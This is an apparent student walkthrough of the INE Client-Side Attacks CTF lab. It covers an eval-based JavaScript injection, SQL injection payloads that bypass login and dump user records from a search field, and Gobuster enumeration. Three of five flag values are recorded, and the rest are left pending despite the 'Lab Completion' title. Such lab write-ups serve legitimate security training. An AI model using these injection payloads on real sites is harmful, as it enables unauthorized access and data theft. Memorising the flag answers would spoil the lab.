INE CTF Walkthrough - Client-Side Attacks (Lab Completion)

Summary

This document serves as a detailed, step-by-step penetration test-style walkthrough for the INE Client-Side Attacks CTF lab. The lab simulates a real-world environment where the tester uses phishing and web exploitation techniques to gain access to internal systems, extract sensitive data, and retrieve 5 CTF flags.

Lab Info

Target Domain: target.ine.local

Internal Targets: Discovered via pivoting post-exploitation

Total Flags: 5

Flag 1: JavaScript Injection in Hidden Script Block

Discovery

While exploring the web application, I discovered a hidden script block in the page source of /about-ctf?total_flags=4 that dynamically evaluated JavaScript code:

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const totalFlags = urlParams.get('total_flags') || 4;

    try {
        const result = eval(totalFlags); // FLAG1_e6e16842770a4a49abe3dcee1db00161
        document.getElementById('flags-result').innerText = `Total Flags to Capture: ${result}`;
    } catch (error) {
        document.getElementById('flags-result').innerText = `Error: Invalid flag number`;
    }
</script>

Exploit

The JavaScript eval call was executing the parameter directly. Viewing the page source revealed Flag 1:

Flag 1: FLAG1_e6e16842770a4a49abe3dcee1db00161

Flag 2: SQL Injection on Login Page

Discovery

Testing the login form with typical SQL injection payloads.

Exploit

Email: ' OR 1=1 --

Password: a

This bypassed authentication and logged me in as the first user in the database (bob). Upon login, the profile revealed the following info:

Email: bob@inestudent.com
Mobile: 6694567890
Address: 93 Main St, NY
Secret: FLAG2_08268a4f3403404c8888da7c83da5367

Flag 2: FLAG2_08268a4f3403404c8888da7c83da5367

Flag 3: SQL Injection via Search Field

Discovery

On the /search page, a user search feature was vulnerable to SQL injection.

Exploit

Used this payload in the search field:

' OR 1=1 ORDER BY 1 --

This returned all users:

187985: bob
243344: alice
354679: charlie
576786: rooty
868871: admin
996783: FLAG3_d4d382a5bdae4370b8b4d1529bcce1ca

Flag 3: FLAG3_d4d382a5bdae4370b8b4d1529bcce1ca

Flag 4: (To Be Retrieved)

Current Status

Gobuster enumeration revealed only /login, /logout, and /search.

Accessing user profiles after login reveals basic personal information.

Further investigation is needed into possible hidden endpoints, IDOR vulnerabilities, or privilege escalation post-login to access additional user secrets.

Tools Used

Gobuster for directory brute-forcing

Manual SQLi testing in login and search inputs

Browser DevTools (network/source inspection)

Notes

The lab behaves similarly to real-world insecure applications vulnerable to classic SQL injection.

Enumerated 6 user entries, 3 of which held flags directly.

Will continue to investigate for remaining flags, focusing next on:

Authenticated endpoint fuzzing

Hidden profile pages

API/JS file review

Flags Found

Flag #

Value

Flag 1

FLAG1_e6e16842770a4a49abe3dcee1db00161

Flag 2

FLAG2_08268a4f3403404c8888da7c83da5367

Flag 3

FLAG3_d4d382a5bdae4370b8b4d1529bcce1ca

Flag 4

(Pending)

Flag 5

(Unknown)

Next Steps

Investigate authenticated user pages or possible insecure direct object reference (IDOR) flaws.

Attempt more advanced payloads for SQLi or fuzzing profile endpoints.
